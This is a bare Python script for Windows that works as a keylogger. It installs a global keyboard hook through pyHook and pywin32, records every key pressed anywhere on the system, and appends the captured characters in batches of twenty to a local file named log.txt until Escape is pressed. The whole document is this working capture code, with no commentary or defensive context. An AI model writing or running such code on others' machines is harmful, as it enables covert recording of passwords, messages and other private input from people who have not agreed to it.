import sys
import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import ctypes

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,1)
buffer = ""

def write_file(buf):
	f=open("log.txt",'a')
	f.write(buf)
	f.close()

def OnKeyboardEvent(event):
	if event.Ascii == 27:
		ctypes.windll.user32.PostQuitMessage(0)
	
	global buffer
	buffer += chr(event.Ascii)

	if len(buffer) >= 20:
		buffer += '\n'
		write_file(buffer)
		buffer = ""

	return True


hm = pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
hm.UnhookKeyboard()
write_file(buffer)
quit()
